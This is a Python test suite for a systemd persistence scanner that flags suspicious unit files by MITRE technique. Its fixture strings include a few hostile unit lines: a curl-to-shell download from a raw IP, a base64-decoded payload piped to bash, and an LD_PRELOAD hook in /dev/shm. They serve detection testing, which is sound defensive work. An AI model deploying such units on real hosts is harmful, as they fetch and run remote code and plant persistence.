"""Tests for the detection rules."""

import os
import stat
import tempfile
import time
import unittest

from tests.helpers import CLEAN, SUSPICIOUS, findings_for, rules_fired

from persistwatch.model import severity_rank
from persistwatch.parser import parse_file, parse_text, scan_directory
from persistwatch.rules import RULES, _seconds, command_binary, shell_tokens
from persistwatch.scanner import filter_by_severity, run_rules, scan

NO_RECENT = {"recent_days": 0}


def run_on_text(text, name="test.service", options=None):
    unit = parse_text(text, path="/fixtures/" + name, name=name)
    return run_rules([unit], options=options or NO_RECENT)


class CleanFixtureTests(unittest.TestCase):
    def test_ordinary_units_produce_no_findings(self):
        _units, findings = scan([CLEAN], options=NO_RECENT)
        self.assertEqual(findings, [], "clean fixtures should be silent: %s" % findings)

    def test_clean_fixtures_parse_without_warnings(self):
        for unit in scan_directory(CLEAN):
            self.assertEqual(unit.parse_errors, [], unit.name)


class ExecPathTests(unittest.TestCase):
    def test_binary_in_tmp_is_high(self):
        findings = findings_for(
            run_on_text("[Service]\nExecStart=/tmp/.payload --quiet\n"),
            "exec_from_suspicious_path",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "high")
        self.assertEqual(findings[0].technique, "T1543.002")

    def test_every_suspicious_prefix_is_covered(self):
        for prefix in ("/tmp", "/var/tmp", "/dev/shm", "/home/alice", "/run/user/1000"):
            findings = findings_for(
                run_on_text("[Service]\nExecStart=%s/payload\n" % prefix),
                "exec_from_suspicious_path",
            )
            self.assertEqual(len(findings), 1, prefix)

    def test_usr_bin_is_not_flagged(self):
        self.assertEqual(
            findings_for(
                run_on_text("[Service]\nExecStart=/usr/bin/borg create\n"),
                "exec_from_suspicious_path",
            ),
            [],
        )

    def test_systemd_exec_prefixes_are_stripped_before_the_check(self):
        findings = findings_for(
            run_on_text("[Service]\nExecStart=-@/tmp/payload\n"),
            "exec_from_suspicious_path",
        )
        self.assertEqual(len(findings), 1)

    def test_relative_path_is_medium(self):
        findings = findings_for(
            run_on_text("[Service]\nExecStart=agent.sh --daemon\n"),
            "exec_relative_path",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "medium")

    def test_absolute_path_is_not_called_relative(self):
        self.assertEqual(
            findings_for(run_on_text("[Service]\nExecStart=/bin/true\n"), "exec_relative_path"),
            [],
        )

    def test_variable_expansion_is_not_called_relative(self):
        self.assertEqual(
            findings_for(run_on_text("[Service]\nExecStart=$MYBIN -D\n"), "exec_relative_path"),
            [],
        )


class ShellAndPayloadTests(unittest.TestCase):
    def test_inline_shell_command_is_high(self):
        findings = findings_for(
            run_on_text('[Service]\nExecStart=/bin/sh -c "id > /tmp/out"\n'),
            "exec_shell_wrapped",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].technique, "T1059.004")

    def test_python_inline_is_flagged_too(self):
        findings = findings_for(
            run_on_text('[Service]\nExecStart=/usr/bin/python3 -c "import os"\n'),
            "exec_shell_wrapped",
        )
        self.assertEqual(len(findings), 1)

    def test_shell_running_a_script_file_is_not_flagged(self):
        self.assertEqual(
            findings_for(
                run_on_text("[Service]\nExecStart=/bin/bash /usr/local/sbin/backup.sh\n"),
                "exec_shell_wrapped",
            ),
            [],
        )

    def test_downloader_inside_a_quoted_shell_string_is_found(self):
        findings = findings_for(
            run_on_text('[Service]\nExecStart=/bin/sh -c "curl -s http://198.51.100.20/p.sh | sh"\n'),
            "exec_network_download",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "high", "a piped download should be high")

    def test_plain_downloader_without_a_pipe_is_medium(self):
        findings = findings_for(
            run_on_text("[Service]\nExecStart=/usr/bin/curl -o /var/cache/f http://example.com/f\n"),
            "exec_network_download",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "medium")

    def test_base64_payload_is_flagged(self):
        findings = findings_for(
            run_on_text('[Service]\nExecStart=/bin/bash -c "echo aWQ= | base64 -d | bash"\n'),
            "exec_encoded_payload",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].technique, "T1027")

    def test_ld_preload_in_environment_is_flagged(self):
        findings = findings_for(
            run_on_text(
                "[Service]\nEnvironment=LD_PRELOAD=/dev/shm/.lib.so\nExecStart=/bin/true\n"
            ),
            "ld_preload",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].technique, "T1574.006")
        self.assertIn("Environment=", findings[0].evidence)

    def test_ordinary_environment_is_not_flagged(self):
        self.assertEqual(
            findings_for(
                run_on_text("[Service]\nEnvironment=NODE_ENV=production\nExecStart=/bin/true\n"),
                "ld_preload",
            ),
            [],
        )


class FilePermissionTests(unittest.TestCase):
    def test_world_writable_unit_file_is_high(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "loose.service")
            with open(path, "w") as handle:
                handle.write("[Unit]\nDescription=loose\n[Service]\nExecStart=/bin/true\n")
            os.chmod(path, 0o666)
            findings = findings_for(
                run_rules([parse_file(path)], options=NO_RECENT), "world_writable_unit"
            )
            self.assertEqual(len(findings), 1)
            self.assertEqual(findings[0].severity, "high")

    def test_normal_mode_unit_file_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "tight.service")
            with open(path, "w") as handle:
                handle.write("[Unit]\nDescription=tight\n[Service]\nExecStart=/bin/true\n")
            os.chmod(path, 0o644)
            self.assertEqual(
                findings_for(
                    run_rules([parse_file(path)], options=NO_RECENT), "world_writable_unit"
                ),
                [],
            )

    def test_world_writable_target_binary_is_high(self):
        with tempfile.TemporaryDirectory() as tmp:
            binary = os.path.join(tmp, "agent")
            with open(binary, "w") as handle:
                handle.write("#!/bin/sh\n")
            os.chmod(binary, 0o777)
            unit_path = os.path.join(tmp, "agent.service")
            with open(unit_path, "w") as handle:
                handle.write("[Unit]\nDescription=agent\n[Service]\nExecStart=%s\n" % binary)
            os.chmod(unit_path, 0o644)
            findings = findings_for(
                run_rules([parse_file(unit_path)], options=NO_RECENT), "world_writable_target"
            )
            self.assertEqual(len(findings), 1)
            self.assertIn(binary, findings[0].evidence)

    def test_missing_target_binary_is_skipped_quietly(self):
        self.assertEqual(
            findings_for(
                run_on_text("[Service]\nExecStart=/opt/not/here/agent\n"),
                "world_writable_target",
            ),
            [],
        )


class RecentlyModifiedTests(unittest.TestCase):
    def _unit_with_age(self, tmp, days_old):
        path = os.path.join(tmp, "aged.service")
        with open(path, "w") as handle:
            handle.write("[Unit]\nDescription=aged\n[Service]\nExecStart=/bin/true\n")
        when = time.time() - days_old * 86400
        os.utime(path, (when, when))
        return parse_file(path)

    def test_unit_changed_today_is_flagged(self):
        with tempfile.TemporaryDirectory() as tmp:
            unit = self._unit_with_age(tmp, 0.5)
            findings = findings_for(
                run_rules([unit], options={"recent_days": 7}), "recently_modified"
            )
            self.assertEqual(len(findings), 1)
            self.assertEqual(findings[0].severity, "low")

    def test_old_unit_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as tmp:
            unit = self._unit_with_age(tmp, 40)
            self.assertEqual(
                findings_for(run_rules([unit], options={"recent_days": 7}), "recently_modified"),
                [],
            )

    def test_zero_days_turns_the_rule_off(self):
        with tempfile.TemporaryDirectory() as tmp:
            unit = self._unit_with_age(tmp, 0.1)
            self.assertEqual(
                findings_for(run_rules([unit], options={"recent_days": 0}), "recently_modified"),
                [],
            )

    def test_window_is_configurable(self):
        with tempfile.TemporaryDirectory() as tmp:
            unit = self._unit_with_age(tmp, 20)
            self.assertEqual(
                findings_for(run_rules([unit], options={"recent_days": 7}), "recently_modified"),
                [],
            )
            self.assertEqual(
                len(findings_for(run_rules([unit], options={"recent_days": 30}),
                                 "recently_modified")),
                1,
            )


class TimerTests(unittest.TestCase):
    def test_fast_timer_is_flagged(self):
        findings = findings_for(
            run_on_text(
                "[Timer]\nOnUnitActiveSec=30s\nUnit=x.service\n", name="x.timer"
            ),
            "timer_high_frequency",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].technique, "T1053.006")

    def test_daily_timer_is_not_flagged(self):
        self.assertEqual(
            findings_for(
                run_on_text("[Timer]\nOnCalendar=daily\nUnit=x.service\n", name="x.timer"),
                "timer_high_frequency",
            ),
            [],
        )

    def test_minutely_calendar_is_flagged(self):
        findings = findings_for(
            run_on_text("[Timer]\nOnCalendar=minutely\nUnit=x.service\n", name="x.timer"),
            "timer_high_frequency",
        )
        self.assertEqual(len(findings), 1)

    def test_threshold_is_configurable(self):
        text = "[Timer]\nOnUnitActiveSec=5min\nUnit=x.service\n"
        self.assertEqual(
            findings_for(
                run_on_text(text, name="x.timer", options={"recent_days": 0}),
                "timer_high_frequency",
            ),
            [],
        )
        self.assertEqual(
            len(
                findings_for(
                    run_on_text(
                        text,
                        name="x.timer",
                        options={"recent_days": 0, "timer_threshold_seconds": 600},
                    ),
                    "timer_high_frequency",
                )
            ),
            1,
        )

    def test_timer_rules_ignore_service_units(self):
        self.assertEqual(
            findings_for(
                run_on_text("[Timer]\nOnUnitActiveSec=5s\n", name="x.service"),
                "timer_high_frequency",
            ),
            [],
        )

    def test_timer_pointing_at_a_missing_unit_is_flagged(self):
        findings = findings_for(
            run_on_text("[Timer]\nOnCalendar=daily\nUnit=ghost.service\n", name="x.timer"),
            "timer_without_unit",
        )
        self.assertEqual(len(findings), 1)
        self.assertIn("ghost.service", findings[0].message)

    def test_timer_with_its_service_present_is_not_flagged(self):
        units = scan_directory(CLEAN)
        findings = findings_for(run_rules(units, options=NO_RECENT), "timer_without_unit")
        self.assertEqual(findings, [])


class NamingTests(unittest.TestCase):
    def test_lookalike_unit_name_is_high(self):
        findings = findings_for(
            run_on_text("[Service]\nExecStart=/bin/true\n", name="systemd-resolvd.service"),
            "lookalike_name",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].technique, "T1036.005")
        self.assertIn("systemd-resolved.service", findings[0].message)

    def test_the_real_name_is_not_flagged(self):
        self.assertEqual(
            findings_for(
                run_on_text("[Service]\nExecStart=/bin/true\n", name="systemd-resolved.service"),
                "lookalike_name",
            ),
            [],
        )

    def test_an_unrelated_name_is_not_flagged(self):
        self.assertEqual(
            findings_for(
                run_on_text("[Service]\nExecStart=/bin/true\n", name="harbourline-sync.service"),
                "lookalike_name",
            ),
            [],
        )

    def test_hidden_unit_file_is_flagged(self):
        findings = findings_for(
            run_on_text("[Service]\nExecStart=/bin/true\n", name=".helper.service"),
            "hidden_unit_file",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].technique, "T1564.001")

    def test_enabled_unit_without_a_description_is_flagged(self):
        findings = findings_for(
            run_on_text("[Service]\nExecStart=/bin/true\n[Install]\nWantedBy=multi-user.target\n"),
            "install_without_description",
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "low")

    def test_described_unit_is_not_flagged(self):
        self.assertEqual(
            findings_for(
                run_on_text(
                    "[Unit]\nDescription=real\n[Service]\nExecStart=/bin/true\n"
                    "[Install]\nWantedBy=multi-user.target\n"
                ),
                "install_without_description",
            ),
            [],
        )


class SuspiciousFixtureTests(unittest.TestCase):
    """The suspicious fixture directory should exercise every rule it claims to."""

    def setUp(self):
        self.units, self.findings = scan([SUSPICIOUS], options=NO_RECENT)

    def test_each_planted_technique_is_caught(self):
        expected = {
            "exec_from_suspicious_path",
            "exec_relative_path",
            "exec_shell_wrapped",
            "exec_network_download",
            "exec_encoded_payload",
            "ld_preload",
            "timer_high_frequency",
            "timer_without_unit",
            "lookalike_name",
            "hidden_unit_file",
            "install_without_description",
        }
        self.assertEqual(expected, expected.intersection(rules_fired(self.findings)))

    def test_findings_are_sorted_worst_first(self):
        ranks = [severity_rank(f.severity) for f in self.findings]
        self.assertEqual(ranks, sorted(ranks, reverse=True))

    def test_every_finding_carries_a_technique_and_a_message(self):
        for finding in self.findings:
            self.assertTrue(finding.technique.startswith("T"), finding)
            self.assertTrue(finding.message, finding)
            self.assertIn(finding.severity, ("high", "medium", "low"), finding)


class EngineTests(unittest.TestCase):
    def test_a_rule_can_be_disabled(self):
        _units, findings = scan([SUSPICIOUS], options=NO_RECENT, disabled=["lookalike_name"])
        self.assertNotIn("lookalike_name", rules_fired(findings))

    def test_disabling_an_unknown_rule_raises(self):
        with self.assertRaises(ValueError):
            scan([SUSPICIOUS], options=NO_RECENT, disabled=["no_such_rule"])

    def test_severity_filter_keeps_only_the_floor_and_above(self):
        _units, findings = scan([SUSPICIOUS], options=NO_RECENT)
        high_only = filter_by_severity(findings, "high")
        self.assertTrue(high_only)
        self.assertTrue(all(f.severity == "high" for f in high_only))
        self.assertEqual(len(filter_by_severity(findings, "low")), len(findings))


class HelperTests(unittest.TestCase):
    def test_time_spans(self):
        self.assertEqual(_seconds("30s"), 30)
        self.assertEqual(_seconds("5min"), 300)
        self.assertEqual(_seconds("1h"), 3600)
        self.assertEqual(_seconds("1h30min"), 5400)
        self.assertEqual(_seconds("90"), 90)
        self.assertIsNone(_seconds("bogus"))
        self.assertIsNone(_seconds(""))

    def test_command_binary_strips_prefixes_and_arguments(self):
        self.assertEqual(command_binary("-/usr/bin/thing --flag"), "/usr/bin/thing")
        self.assertEqual(command_binary('@/bin/sh -c "x"'), "/bin/sh")
        self.assertEqual(command_binary(""), "")

    def test_shell_tokens_look_inside_quotes(self):
        tokens = shell_tokens('/bin/sh -c "curl http://x/y | bash"')
        self.assertIn("curl", tokens)
        self.assertIn("bash", tokens)

    def test_unbalanced_quotes_do_not_raise(self):
        self.assertEqual(command_binary('/bin/sh -c "unclosed'), "/bin/sh")

    def test_every_rule_is_registered_under_its_own_name(self):
        self.assertEqual(len(RULES), 14)
        for name, rule in RULES.items():
            self.assertTrue(callable(rule), name)


if __name__ == "__main__":
    unittest.main()
